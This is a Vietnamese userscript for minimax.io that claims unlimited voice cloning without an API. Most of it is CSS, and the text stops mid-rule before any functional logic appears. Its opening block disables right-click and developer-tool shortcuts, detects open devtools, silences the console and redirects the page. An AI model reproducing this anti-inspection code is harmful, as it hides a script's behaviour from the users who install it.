// ==UserScript==
// @name         Clone Voice (Không cần API) - Modded
// @namespace    mmx-secure
// @version      1.1.0
// @description  Tạo audio giọng nói clone theo ý của bạn. Không giới hạn. Thêm chức năng Ghép hội thoại & Đổi văn bản hàng loạt.
// @match        https://www.minimax.io/audio*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=minimax.io
// @run-at       document-end
// @grant        GM_xmlhttpRequest
// @grant        GM_registerMenuCommand
// @grant        GM_addStyle
// @require      https://cdn.jsdelivr.net/npm/jszip@3.10.1/dist/jszip.min.js
// @connect      unpkg.com
// @connect      cdn.jsdelivr.net
// ==/UserScript==


(function () {
    'use strict';

    // =================================================================
    // == CHỐNG F12 / CHỐNG DEVTOOLS ==
    // =================================================================
    (function() {
        'use strict';
        
        // 1. Disable right-click
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
            return false;
        }, true);
        
        // 2. Disable F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
        document.addEventListener('keydown', function(e) {
            // F12
            if (e.key === 'F12' || e.keyCode === 123) {
                e.preventDefault();
                return false;
            }
            // Ctrl+Shift+I (DevTools)
            if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.keyCode === 73)) {
                e.preventDefault();
                return false;
            }
            // Ctrl+Shift+J (Console)
            if (e.ctrlKey && e.shiftKey && (e.key === 'J' || e.keyCode === 74)) {
                e.preventDefault();
                return false;
            }
            // Ctrl+Shift+C (Inspect Element)
            if (e.ctrlKey && e.shiftKey && (e.key === 'C' || e.keyCode === 67)) {
                e.preventDefault();
                return false;
            }
            // Ctrl+U (View Source)
            if (e.ctrlKey && (e.key === 'U' || e.keyCode === 85)) {
                e.preventDefault();
                return false;
            }
        }, true);
        
        // 3. Detect DevTools bằng cách check window size
        let devtoolsOpen = false;
        const threshold = 160;
        
        const detectDevTools = () => {
            const widthThreshold = window.outerWidth - window.innerWidth > threshold;
            const heightThreshold = window.outerHeight - window.innerHeight > threshold;
            const orientation = widthThreshold ? 'vertical' : 'horizontal';
            
            if (!(heightThreshold && widthThreshold) && 
                ((window.Firebug && window.Firebug.chrome && window.Firebug.chrome.isInitialized) || 
                 widthThreshold || heightThreshold)) {
                if (!devtoolsOpen) {
                    devtoolsOpen = true;
                    console.clear();
                    // Redirect về trang chủ nếu phát hiện DevTools
                    if (window.location.href.includes('minimax.io/audio')) {
                        window.location.href = 'https://www.minimax.io/audio/voices-cloning';
                    }
                }
            } else {
                devtoolsOpen = false;
            }
        };
        
        // 4. Detect DevTools bằng debugger statement
        const detectDevToolsDebugger = () => {
            const before = new Date().getTime();
            debugger;
            const after = new Date().getTime();
            
            if (after - before > 100) {
                // DevTools detected
                console.clear();
                if (window.location.href.includes('minimax.io/audio')) {
                    window.location.href = 'https://www.minimax.io/audio/voices-cloning';
                }
            }
        };
        
        // 5. Clear console định kỳ
        const clearConsoleInterval = setInterval(() => {
            console.clear();
        }, 1000);
        
        // 6. Check DevTools định kỳ
        setInterval(detectDevTools, 1000);
        
        // 7. Protect console methods
        const noop = () => {};
        const methods = ['log', 'debug', 'info', 'warn', 'error', 'table', 'trace', 'dir', 'group', 'groupCollapsed', 'groupEnd', 'clear'];
        methods.forEach(method => {
            console[method] = noop;
        });
        
        // 8. Detect DevTools using toString()
        const element = new Image();
        Object.defineProperty(element, 'id', {
            get: function() {
                devtoolsOpen = true;
                if (window.location.href.includes('minimax.io/audio')) {
                    window.location.href = 'https://www.minimax.io/audio/voices-cloning';
                }
            }
        });
        
        console.log('%c', element);
        
        console.log('%c⚠️ CẢNH BÁO BẢO MẬT', 'color: red; font-size: 40px; font-weight: bold;');
        console.log('%cNếu có người bảo bạn copy/paste code vào đây, đó có thể là lừa đảo!', 'color: yellow; font-size: 16px;');
        
    })();


    // =================================================================
    // == PHẦN CSS VÀ CÁC HÀM KHÁC ==
    // =================================================================

    const SCRIPT_CSS = `.logo{background:#fff;width:fit-content;padding:2px;border-radius:8px}.logo-user{display:flex;flex-direction:row;flex-wrap:nowrap;justify-content:space-between;align-items:center}.mmx-login-prompt-btn{position:fixed;z-index:999990;background-color:#6a4ff1;color:#fff;padding:10px 20px;font-size:16px;font-weight:700;border:none;border-radius:8px;cursor:pointer;box-shadow:0 5px 15px rgba(0,0,0,0.3);text-decoration:none;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;transition:transform .2s ease,background-color .2s ease;top:10px;left:50%}.mmx-login-prompt-btn:hover{background-color:#462fb8}#mmx-login-overlay{position:fixed;inset:0;z-index:999999;background:#0f1220;color:#e5e7eb;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;display:flex;align-items:center;justify-content:center}#mmx-login-card{width:420px;max-width:92vw;background:#171a2a;border:1px solid #27304a;border-radius:14px;padding:22px 20px;box-shadow:0 10px 30px rgba(0,0,0,.45)}#mmx-login-card h2{font-size:20px;color:#8be9fd}#mmx-login-card p.sub{color:#94a3b8;font-size:13px}#mmx-login-form label{display:block;font-size:13px;margin-bottom:6px;color:#c7d2fe}#mmx-api-input{width:100%;box-sizing:border-box;padding:12px;border-radius:10px;border:1px solid #334155;background:#0b1020;color:#e2e8f0;outline:none}#mmx-api-input::placeholder{color:#64748b}#mmx-login-actions{display:flex;gap:10px;margin-top:14px;align-items:center}#mmx-login-btn{flex:1;padding:10px 14px;background:#50fa7b;color:#0b1020;border:none;border-radius:10px;font-weight:700;cursor:pointer}#mmx-login-btn[disabled]{opacity:.6;cursor:not-allowed}#mmx-login-msg{margin-top:10px;font-size:18px;color:#f87171}#mmx-remember{display:flex;gap:8px;align-items:center;font-size:12px;color:#a8b3cf;margin-top:8px}#mmx-fade{position:fixed;inset:0;background:transparent;pointer-events:none;transition:background .25s ease}#mmx-login-brand{display:flex;gap:10px;align-items:center;margin-bottom:12px}#mmx-login-brand img{width:40px;height:40px;border-radius:7px}body.mmx-active{overflow:hidden}#gemini-main-container{display:flex;width:100vw;height:100vh;position:fixed;top:0;left:0;background-color:#282a36;color:#f8f8f2;z-index:9999;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;gap:10px;padding:10px;box-sizing:border-box}.gemini-column{display:flex;flex-direction:column;min-height:100%;max-height:100%;background-color:#3b3d4a;border-radius:8px;border:1px solid #44475a;box-shadow:0 4px 12px rgba(0,0,0,0.2)}#gemini-col-1{width:20%}#gemini-col-2{width:60%}#gemini-col-3{width:20%}.column-header{padding:10px 15px;background-color:#44475a;border-bottom:1px solid #6272a4;border-top-left-radius:8px;border-top-right-radius:8px;flex-shrink:0}.column-header h3{margin:0;font-size:16px;color:#bd93f9}.column-content{padding:15px;overflow-y:auto;flex-grow:1}.box-info-version{display:flex;flex-direction:row;flex-wrap:nowrap;justify-content:space-between;align-items:center}.column-content::-webkit-scrollbar{width:6px}.column-content::-webkit-scrollbar-track{background:#282a36}.column-content::-webkit-scrollbar-thumb{background:#6272a4;border-radius:3px}.column-content::-webkit-scrollbar-thumb:hover{background:#bd93f9}.section{margin-bottom:20px}.section h4{margin:0 0 10px;color:#bd93f9;font-size:14px;border-bottom:1px solid #44475a;padding-bottom:5px}#gemini-file-input,#gemini-language-select,#gemini-main-textarea{width:100%;box-sizing:border-box;background-color:#282a36;color:#f8f8f2;border:1px solid #6272a4;border-radius:4px;padding:10px;margin-bottom:8px;font-size:14px}#gemini-main-textarea{height:42vh;resize:vertical}#gemini-text-stats{display:flex;justify-content:space-around;font-size:12px;color:#f1fa8c;background-color:#44475a;padding:5px;border-radius:4px;margin-top:5px}button{width:100%;padding:12px;border:none;border-radius:5px;font-weight:700;font-size:14px;cursor:pointer;transition:all .2s ease-in-out}button:disabled{background-color:#6c757d!important;color:#333!important;cursor:not-allowed}#gemini-upload-btn{background-color:#8be9fd;color:#282a36}#gemini-upload-btn:hover{background-color:#79dce9}#gemini-start-queue-btn{background-color:#50fa7b;color:#282a36}#gemini-start-queue-btn:hover{background-color:#48e06e}#gemini-pause-btn{background-color:#ffb86c;color:#282a36;margin-top:10px}#gemini-pause-btn:hover{background-color:#ffa85c}#gemini-stop-btn{background-color:#f55;color:#282a36;margin-top:10px}#gemini-stop-btn:hover{background-color:#e44}#gemini-progress-container{width:100%;background-color:#282a36;border-radius:5px;margin-top:15px;padding:3px;position:relative;border:1px solid #6272a4}#gemini-progress-bar{width:0;height:20px;background:linear-gradient(90deg,#ff79c6,#bd93f9);border-radius:3px;transition:width .4s ease-in-out}#gemini-progress-label{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);color:#fff;font-weight:700;font-size:12px;text-shadow:1px 1px 2px #000}#gemini-final-result{margin-top:20px}#gemini-time-taken{font-size:14px;color:#8be9fd;text-align:center;margin-bottom:10px;font-weight:700}#gemini-waveform{background-color:#282a36;border-radius:5px;border:1px solid #6272a4;padding:10px}#waveform-controls a,#waveform-controls button{display:inline-block;width:auto;padding:8px 15px;margin:0 5px;text-decoration:none;font-weight:700;border-radius:5px}#waveform-play-pause{background-color:#ffb86c;color:#282a36}#gemini-download-merged-btn{background-color:#8be9fd;color:#282a36}.banner-column a{display:block;margin-bottom:15px}.banner-column img{width:100%;height:auto;border-radius:5px;border:1px solid #6272a4;transition:transform 0.2s,box-shadow .2s}.banner-column img:hover{transform:scale(1.03);box-shadow:0 0 15px #bd93f9}#gemini-user-info{display:flex;align-items:center;gap:10px;background-color:#44475a}#gemini-user-info img{width:40px;height:40px;border-radius:50%;border:2px solid #bd93f9}#gemini-user-credits{font-size:14px;font-weight:700;color:#50fa7b}.social-minimax{margin:20px 0!important}.social-minimax a{display:flex;flex-direction:row;flex-wrap:nowrap;align-items:center;justify-content:flex-start;gap:10px;margin-bottom:10px!important;cursor:pointer;font-size:14px;font-weight:700}.social-minimax img{width:20px;height:20px}#gemini-upload-status{margin-top:10px;font-size:14px;color:#50fa7b;text-align:center}.social-minimax-login{display:grid;grid-template-columns:1fr 1fr;grid-template-rows:auto;gap:10px}.social-minimax.social-minimax-login{margin-bottom:0!important}.chinh-sach-su-dung,.social-minimax{background:#44475a;border:1px solid #27304a;border-radius:4px;padding:15px}.chinh-sach-su-dung h2,.social-minimax h2{font-size:16px;font-weight:700;margin-bottom:10px}.chinh-sach-su-dung ul{list-style:auto;padding-left:20px}.chinh-sach-su-dung ul{}.chinh-sach-su-dung li{margin-bottom:10px}.box-ads-img{display:grid;grid-template-columns:1fr 1fr;grid-template-rows:auto;gap:10px}a.youtube123{display:flex;gap:10px;flex-direction:row;flex-wrap:nowrap;align-items:center;justify-content:flex-start;font-size: 16px;font-weight: bold;color: #ffe900;}.youtube123 img{width:max-content;height:30px;border:none;border-radius:6px;background:#fff;padding:0 2px!important}
/* Styles for Merge Button */
#gemini-merge-btn {
    background: linear-gradient(135deg, #fbbf24 0%, #f59e0b 100%) !important;
    color: #1a1d2e !important;
    font-weight: 700 !important;
    border: none !important;
    padding: 12px 16px !important;
    border-radius: 8px !important;
    cursor: pointer !important;
    transition: all 0.3s ease !important;
}

#gemini-merge-btn:hover {
    background: linear-gradient(135deg, #fcd34d 0%, #fbbf24 100%) !important;
    box-shadow: 0 4px 20px rgba(251, 191, 36, 0.5) !important;
    transform: translateY(-2px) !important;
}

/* Styles for Punctuation Settings Button */
#open-punctuation-settings-btn {
    background: linear-gradient(135deg, #a855f7 0%, #7c3aed 100%) !important;
    color: #ffffff !important;
    font-weight: 700 !important;
    border: none !important;
    padding: 12px 16px !important;
    border-radius: 8px !important;
    cursor: pointer !important;
    transition: all 0.3s ease !important;
}

#open-punctuation-settings-btn:hover {
    background: linear-gradient(135deg, #c084fc 0%, #a855f7 100%) !important;
    box-shadow: 0 4px 20px rgba(168, 85, 247, 0.5) !important;
    transform: translateY(-2px) !important;
}

/* Styles for Log Modal Button */
#open-log-modal-btn {
    background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%) !important;
    color: #ffffff !important;
    font-weight: 700 !important;
    border: none !important;
    padding: 12px 16px !important;
    border-radius: 8px !important;
    cursor: pointer !important;
    transition: all 0.3s ease !important;
}

#open-log-modal-btn:hover {
    background: linear-gradient(135deg, #60a5fa 0%, #3b82f6 100%) !important;
    box-shadow: 0 4px 20px rgba(59, 130, 246, 0.5) !important;
    transform: translateY(-2px) !important;
}

/* Styles for Load Text File Button */
#load-text-file-btn {
    background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%) !important;
    color: #ffffff !important;
    font-weight: 600 !important;
    border: none !important;
    padding: 6px 12px !important;
    border-radius: 6px !important;
    cursor: pointer !important;
    transition: all 0.3s ease !important;
    box-shadow: 0 2px 8px rgba(59, 130, 246, 0.3) !important;
    font-size: 12px !important;
}

#load-text-file-btn:hover {
    background: linear-gradient(135deg, #60a5fa 0%, #3b82f6 100%) !important;
    box-shadow: 0 4px 15px rgba(59, 130, 246, 0.5) !important;
    transform: translateY(-1px) !important;
}

/* Styles for Waveform Control Buttons */
#waveform-play-pause {
    background: linear-gradient(135deg, #fbbf24 0%, #f59e0b 100%) !important;
    color: #1a1d2e !important;
    font-weight: 700 !important;
    border: none !important;
    padding: 12px 16px !important;
    border-radius: 8px !important;
    cursor: pointer !important;
    transition: all 0.3s ease !important;
}

#waveform-play-pause:hover {
    background: linear-gradient(135deg, #fcd34d 0%, #fbbf24 100%) !important;
    box-shadow: 0 4px 20px rgba(251, 191, 36, 0.5) !important;
    transform: translateY(-2px) !important;
}

#gemini-download-merged-btn {
    background: linear-gradient(135deg, #10b981 0%, #059669 100%) !important;
    color: #fff !important;
    font-weight: 700 !important;
    border: none !important;
    padding: 12px 16px !important;
    border-radius: 8px !important;
    cursor: pointer !important;
    transition: all 0.3s ease !important;
    box-shadow: 0 4px 15px rgba(16, 185, 129, 0.3) !important;
}

#gemini-download-merged-btn:hover {
    background: linear-gradient(135deg, #34d399 0%, #10b981 100%) !important;
    box-shadow: 0 6px 25px rgba(16, 185, 129, 0.5) !important;
    transform: translateY(-2px) !important;
}

#gemini-download-chunks-btn {
    background: linear-gradient(135deg, #8b5cf6 0%, #7c3aed 100%) !important;
    color: #fff !important;
    font-weight: 700 !important;
    border: none !important;
    padding: 12px 16px !important;
    border-radius: 8px !important;
    cursor: pointer !important;
    transition: all 0.3s ease !important;
}

#gemini-download-chunks-btn:hover {
    background: linear-gradient(135deg, #a78bfa 0%, #8b5cf6 100%) !important;
    box-shadow: 0 4px 20px rgba(139, 92, 246, 0.5) !important;
    transform: translateY(-2px) !important;
}
/* Styles for Batch Replace Section */
#batch-replace-section{margin-top:20px;background:#2d3148;border:2px solid #3d4158;border-radius:12px;padding:15px}
#batch-replace-section h4{margin:0 0 12px;color:#00d4ff;font-size:15px;border-bottom:2px solid #3d4158;padding-bottom:8px;font-weight:600}
#batch-replace-pairs{display:flex;flex-direction:column;gap:8px;max-height:30vh;overflow-y:auto;padding-right:5px;margin-bottom:10px}
#batch-replace-pairs::-webkit-scrollbar{width:8px}
#batch-replace-pairs::-webkit-scrollbar-track{background:#1a1d2e}
#batch-replace-pairs::-webkit-scrollbar-thumb{background:#00d4ff;border-radius:4px}
#batch-replace-pairs::-webkit-scrollbar-thumb:hover{background:#00e5ff}
.replace-pair-row{display:flex;gap:8px;align-items:center}
.replace-pair-row input{flex-grow:1;width:40%;box-sizing:border-box;background-color:#1a1d2e;color:#f8f8f2;border:2px solid #2d3148;border-radius:8px;padding:8px 10px;font-size:13px}
.replace-pair-row .remove-pair-btn{width:28px;height:28px;min-width:28px;padding:0;font-size:20px;line-height:1;background:linear-gradient(135deg,#ef4444 0%,#dc2626 100%);color:#fff;flex-shrink:0;border-radius:6px;display:flex;align-items:center;justify-content:center;cursor:pointer;transition:all 0.2s ease}
.replace-pair-row .remove-pair-btn:hover{transform:scale(1.1);box-shadow:0 4px 12px rgba(239,68,68,0.4)}
#batch-replace-actions{display:flex;gap:8px;margin-top:10px}
#add-replace-pair-btn{width:auto;min-width:42px;background:linear-gradient(135deg,#a855f7 0%,#7c3aed 100%);color:#fff;padding:8px 14px;font-size:16px;border-radius:8px}
#add-replace-pair-btn:hover{transform:translateY(-2px);box-shadow:0 4px 12px rgba(168,85,247,0.4)}
#execute-replace-btn{flex-grow:1;background:linear-gradient(135deg,#00d4ff 0%,#00a8cc 100%);color:#fff;padding:8px 16px;font-size:13px;font-weight:600;border-radius:8px}
#execute-replace-btn:hover{transform:translateY(-2px);box-shadow:0 4px 12px rgba(0,212,255,0.4)}
/* Log Section Styles */
.log-section{background:#44475a;border:1px solid #27304a;border-radius:4px;padding:15px;margin-top:15px}
.log-section h2{font-size:16px;font-weight:700;margin-bottom:10px;color:#bd93f9}
.log-container{background:#282a36;border:1px solid #6272a4;border-radius:4px;padding:10px;max-height:200px;overflow-y:auto;margin-bottom:10px}
.log-container::-webkit-scrollbar{width:6px}
.log-container::-webkit-scrollbar-track{background:#282a36}
.log-container::-webkit-scrollbar-thumb{background:#6272a4;border-radius:3px}
.log-container::-webkit-scrollbar-thumb:hover{background:#bd93f9}
.log-entry{color:#f8f8f2;font-size:12px;margin-bottom:5px;padding:3px 0;border-bottom:1px solid #44475a}
.log-entry:last-child{border-bottom:none}
.log-entry.info{color:#8be9fd}
.log-entry.success{color:#50fa7b}
.log-entry.warning{color:#ffb86c}
.log-entry.error{color:#f55}
.clear-log-btn{width:100%;background-color:#f55;color:#f8f8f2;padding:8px;border:none;border-radius:4px;font-weight:700;cursor:pointer;transition:background-color .2s ease}
.clear-log-btn:hover{background-color:#e44}

/* START: Styles for Punctuation Settings Modal */
.punctuation-modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.6); z-index: 10000; display: flex; align-items: center; justify-content: center; }
.punctuation-modal-card { background: #3b3d4a; border-radius: 8px; border: 1px solid #44475a; box-shadow: 0 5px 20px rgba(0,0,0,0.3); width: 380px; max-width: 90vw; color: #f8f8f2; }
.punctuation-modal-header { display: flex; justify-content: space-between; align-items: center; padding: 12px 18px; background-color: #44475a; border-bottom: 1px solid #6272a4; border-top-left-radius: 8px; border-top-right-radius: 8px; }
.punctuation-modal-header h3 { margin: 0; font-size: 16px; color: #bd93f9; }
.punctuation-modal-close-btn { background: none; border: none; color: #f8f8f2; font-size: 24px; cursor: pointer; padding: 0; line-height: 1; width: auto; }
.punctuation-modal-body { padding: 20px; display: flex; flex-direction: column; gap: 15px; }
.punctuation-setting-row { display: grid; grid-template-columns: 120px 1fr; align-items: center; gap: 10px; }
.punctuation-setting-row label { font-size: 14px; }
.punctuation-input-group { display: flex; align-items: center; background-color: #282a36; border: 1px solid #6272a4; border-radius: 4px; }
.punctuation-input-group button { width: 30px; height: 30px; background: #44475a; color: #f8f8f2; border: none; font-size: 18px; cursor: pointer; padding: 0; line-height: 30px; }
.punctuation-input-group button:first-child { border-top-left-radius: 3px; border-bottom-left-radius: 3px; border-right: 1px solid #6272a4; }
.punctuation-input-group button:last-child { border-top-right-radius: 3px; border-bottom-right-radius: 3px; border-left: 1px solid #6272a4; }
.punctuation-input-group input { width: 100%; text-align: center; background: transparent; border: none; color: #f8f8f2; padding: 5px; font-size: 14px; -moz-appearance: textfield; }
.punctuation-input-group input::-webkit-outer-spin-button, .punctuation-input-group input::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
.punctuation-modal-footer { padding: 12px 18px; background: #44475a; border-top: 1px solid #6272a4; display: flex; gap: 10px; border-bottom-left-radius: 8px; border-bottom-right-radius: 8px; }
#save-punctuation-settings-btn { background: linear-gradient(135deg, #46ffd9, #12c8f2); color: #0b0e14; flex-grow: 1; }
#default-punctuation-settings-btn { background: linear-gradient(135deg, #ffc76c, #ff9e4c); color: #1e1108; flex-grow: 1; }
.punctuation-setting-row.toggle-row{grid-template-columns:1fr auto;padding-bottom:10px;border-bottom:1px solid #44475a;margin-bottom:15px}.toggle-row label{font-weight:700;color:#8be9fd}.switch{position:relative;display:inline-block;width:50px;height:28px}.switch input{opacity:0;width:0;height:0}.slider{position:absolute;cursor:pointer;top:0;left:0;right:0;bottom:0;background-color:#6272a4;-webkit-transition:.4s;transition:.4s}.slider:before{position:absolute;content:"";height:20px;width:20px;left:4px;bottom:4px;background-color:#fff;-webkit-transition:.4s;transition:.4s}input:checked+.slider{background-color:#50fa7b}input:focus+.slider{box-shadow:0 0 1px #50fa7b}input:checked+.slider:before{-webkit-transform:translateX(22px);-ms-transform:translateX(22px);transform:translateX(22px)}.slider.round{border-radius:28px}.slider.round:before{border-radius:50%}
/* END: Styles for Punctuation Settings Modal */

/* START: Styles for Audio Folder Manager */
#audio-folder-manager {
    margin-top: 20px;
    margin-bottom: 20px;
    background: rgba(22,28,45,0.55);
    border: 1px solid rgba(100,150,255,0.1);
    border-radius: 14px;
    padding: 15px;
    box-shadow: inset 0 0 15px rgba(100,200,255,0.05);
    position: relative;
    z-index: 1;
    display: block !important;
    visibility: visible !important;
}

#audio-folder-manager h4 {
    margin: 0 0 10px;
    color: #92e7ff;
    font-size: 14px;
    border-bottom: 1px solid rgba(100,200,255,0.2);
    padding-bottom: 5px;
    text-shadow: 0 0 8px rgba(90,200,255,0.3);
}

#folder-select-btn {
    background: linear-gradient(135deg, #46ffd9, #12c8f2);
    color: #0b0e14;
    margin-bottom: 10px;
    font-weight: 700;
    width: 100% !important;
    display: block !important;
    cursor: pointer !important;
    position: relative;
    z-index: 2;
}

#folder-select-btn:hover {
    background: linear-gradient(135deg, #5bfff1, #3bd8ff);
    box-shadow: 0 0 25px rgba(90,255,230,0.6);
}

#selected-folder-path {
    background: #282a36;
    border: 1px solid #6272a4;
    border-radius: 4px;
    padding: 8px;
    margin-bottom: 10px;
    color: #f1fa8c;
    font-size: 12px;
    cursor: pointer;
    transition: all 0.2s ease;
}

#selected-folder-path:hover {
    background-color: #44475a;
    border-radius: 4px;
    padding: 4px 8px;
}

#audio-list-container {
    max-height: 200px;
    overflow-y: auto;
    background: #282a36;
    border: 1px solid #6272a4;
    border-radius: 4px;
    margin-bottom: 10px;
}

#audio-list-container::-webkit-scrollbar {
    width: 6px;
}

#audio-list-container::-webkit-scrollbar-track {
    background: #282a36;
}

#audio-list-container::-webkit-scrollbar-thumb {
    background: #6272a4;
    border-radius: 3px;
}

#audio-list-container::-webkit-scrollbar-thumb:hover {
    background: #bd93f9;
}

.audio-item {
    display: flex;
    align-items: center;
    padding: 8px;
    border-bottom: 1px solid #44475a;
    transition: background-color 0.2s ease;
}

.audio-item:hover {
    background-color: #44475a;
}

.audio-item.playing {
    background-color: #50fa7b;
    color: #282a36;
}

.audio-name {
    flex-grow: 1;
    font-size: 12px;
    color: #f8f8f2;
    margin-right: 10px;
    overflow: hidden;
    text-overflow: ellipsis;
    white-space: nowrap;
}

.audio-duration {
    font-size: 11px;
    color: #8be9fd;
    margin-right: 10px;
    min-width: 40px;
}

.play-btn {
    width: 24px;
    height: 24px;
    padding: 0;
    font-size: 12px;
    background-color: #6272a4;
    color: #f8f8f2;
    border: none;
    border-radius: 50%;
    cursor: pointer;
    display: flex;
    align-items: center;
    justify-content: center;
    transition: background-color 0.2s ease;
}

.play-btn:hover {
    background-color: #50fa7b;
    color: #282a36;
}

.play-btn:disabled {
    background-color: #6c757d;
    cursor: not-allowed;
}

#refresh-audio-list-btn {
    background: linear-gradient(135deg, #46ffd9, #12c8f2);
    color: #0b0e14;
    font-size: 12px;
    padding: 8px;
    width: 100% !important;
    display: block !important;
    cursor: pointer !important;
    position: relative;
    z-index: 2;
}

#refresh-audio-list-btn:hover {
    background: linear-gradient(135deg, #5bfff1, #3bd8ff);
    box-shadow: 0 0 25px rgba(90,255,230,0.6);
}
/* END: Styles for Audio Folder Manager */

/* START: Styles for Punctuation Detection Modal */
#punctuation-detection-modal {
    backdrop-filter: blur(5px);
    animation: fadeIn 0.3s ease;
}

#punctuation-detection-modal > div {
    animation: slideIn 0.3s ease;
    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
}

/* Danh sách lỗi dấu câu */
#punctuation-issues-list {
    max-height: 300px;
    overflow-y: auto;
    scrollbar-width: thin;
    scrollbar-color: #6272a4 #282a36;
}

#punctuation-issues-list::-webkit-scrollbar {
    width: 8px;
}

#punctuation-issues-list::-webkit-scrollbar-track {
    background: #282a36;
    border-radius: 4px;
}

#punctuation-issues-list::-webkit-scrollbar-thumb {
    background: #6272a4;
    border-radius: 4px;
}

#punctuation-issues-list::-webkit-scrollbar-thumb:hover {
    background: #50fa7b;
}

/* Nút trong modal */
#auto-fix-punctuation-btn {
    background: linear-gradient(135deg, #46ffd9, #12c8f2) !important;
    color: #0b0e14 !important;
    transition: all 0.3s ease;
    font-weight: bold;
    position: relative;
    overflow: hidden;
}

#auto-fix-punctuation-btn:hover {
    background: linear-gradient(135deg, #5bfff1, #3bd8ff) !important;
    transform: translateY(-2px);
    box-shadow: 0 4px 12px rgba(90, 255, 230, 0.6);
}

#ignore-punctuation-btn {
    background: rgba(90,100,120,0.6) !important;
    transition: all 0.3s ease;
    font-weight: bold;
    position: relative;
    overflow: hidden;
}

#ignore-punctuation-btn:hover {
    background: rgba(110,120,150,0.8) !important;
    transform: translateY(-2px);
    box-shadow: 0 4px 12px rgba(98, 114, 164, 0.4);
}

/* Nút đóng modal */
#close-punctuation-modal {
    transition: all 0.2s ease;
}

#close-punctuation-modal:hover {
    background: #ff3333 !important;
    transform: scale(1.1);
}

/* Select dropdown */
#default-punctuation-select {
    transition: all 0.2s ease;
}

#default-punctuation-select:hover {
    border-color: #50fa7b !important;
    box-shadow: 0 0 0 2px rgba(80, 250, 123, 0.2);
}

#default-punctuation-select:focus {
    outline: none;
    border-color: #50fa7b !important;
    box-shadow: 0 0 0 2px rgba(80, 250, 123, 0.3);
}

/* Items trong danh sách lỗi */
.punctuation-issue-item {
    transition: all 0.2s ease;
}

.punctuation-issue-item:hover {
    transform: translateX(5px);
    box-shadow: 0 2px 8px rgba(0, 0, 0, 0.3);
}

/* Animations */
@keyframes fadeIn {
    from { opacity: 0; }
    to { opacity: 1; }
}

@keyframes slideIn {
    from {
        opacity: 0;
        transform: translateY(-30px) scale(0.9);
    }
    to {
        opacity: 1;
        transform: translateY(0) scale(1);
    }
}

/* Responsive design */
@media (max-width: 768px) {
    #punctuation-detection-modal > div {
        width: 95%;
        padding: 15px;
        max-height: 90vh;
    }

    #punctuation-detection-modal h3 {
        font-size: 16px;
    }

    #auto-fix-punctuation-btn, #ignore-punctuation-btn {
        min-width: 100px;
        padding: 10px 16px;
        font-size: 13px;
    }

    .punctuation-issue-item {
        padding: 10px;
        font-size: 13px;
    }
}

@media (max-width: 480px) {
    #punctuation-detection-modal > div {
        width: 98%;
        padding: 10px;
    }

    #punctuation-detection-modal h3 {
        font-size: 14px;
    }

    #auto-fix-punctuation-btn, #ignore-punctuation-btn {
        width: 100%;
        margin: 5px 0;
    }
}
/* END: Styles for Punctuation Detection Modal */

/* START: Styles for Custom Filename Input */
#custom-filename-input {
    background: linear-gradient(135deg, #2d3748 0%, #1a202c 100%) !important;
    border: 2px solid #6272a4 !important;
    border-radius: 12px !important;
    padding: 14px !important;
    transition: all 0.3s ease !important;
    font-family: inherit !important;
    color: #f8f8f2 !important;
    font-size: 14px !important;
}

#custom-filename-input:focus {
    border-color: #8be9fd !important;
    box-shadow: 0 0 0 3px rgba(139, 233, 253, 0.1) !important;
    outline: none !important;
}

#custom-filename-input::placeholder {
    color: #94a3b8 !important;
    font-style: italic !important;
}

.custom-filename-section {
    background: rgba(68, 75, 90, 0.3) !important;
    border: 1px solid rgba(98, 114, 164, 0.2) !important;
    border-radius: 8px !important;
    padding: 15px !important;
    margin-top: 15px !important;
}

.custom-filename-section label {
    color: #bd93f9 !important;
    font-weight: 600 !important;
    font-size: 14px !important;
    margin-bottom: 8px !important;
    display: block !important;
}

.custom-filename-section small {
    color: #94a3b8 !important;
    font-size: 12px !important;
    margin-top: 5px !important;
    display: block !important;
    line-height: 1.4 !important;
}
/* END: Styles for Custom Filename Input */

/* ===== MODERN UI IMPROVEMENTS ===== */
* {
    box-sizing: border-box;
}

body {
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
    line-height: 1.6;
}

/* Enhanced Logo */
.logo {
    background: linear-gradient(90deg, #4fd1c5, #4299e1) !important;
    -webkit-background-clip: text !important;
    -webkit-text-fill-color: transparent !important;
    font-weight: 800 !important;
    font-size: 22px !important;
    text-shadow: 0 0 12px rgba(90, 200, 255, 0.4) !important;
    width: fit-content !important;
    padding: 8px 16px !important;
}

/* Enhanced Main Container */
#gemini-main-container {
    background: linear-gradient(135deg, #1a1d2e 0%, #16213e 100%) !important;
    gap: 16px !important;
    padding: 16px !important;
}

/* Enhanced Columns */
.gemini-column {
    background: linear-gradient(135deg, #2d3748 0%, #1a202c 100%) !important;
    border-radius: 16px !important;
    border: 1px solid #4a5568 !important;
    box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3) !important;
    backdrop-filter: blur(20px) !important;
    overflow: hidden !important;
}

#gemini-col-1 {
    width: 35% !important;
    min-width: 350px !important;
}

#gemini-col-2 {
    width: 65% !important;
    min-width: 500px !important;
}

/* Enhanced Headers */
.column-header {
    padding: 16px 20px !important;
    background: linear-gradient(135deg, #4a5568 0%, #2d3748 100%) !important;
    border-top-left-radius: 16px !important;
    border-top-right-radius: 16px !important;
    position: relative !important;
}

.column-header::after {
    content: '';
    position: absolute;
    bottom: 0;
    left: 0;
    right: 0;
    height: 2px;
    background: linear-gradient(90deg, #8be9fd, #bd93f9, #ff79c6);
}

.column-header h3 {
    font-size: 18px !important;
    font-weight: 700 !important;
    text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3) !important;
}

/* Enhanced Content */
.column-content {
    padding: 20px !important;
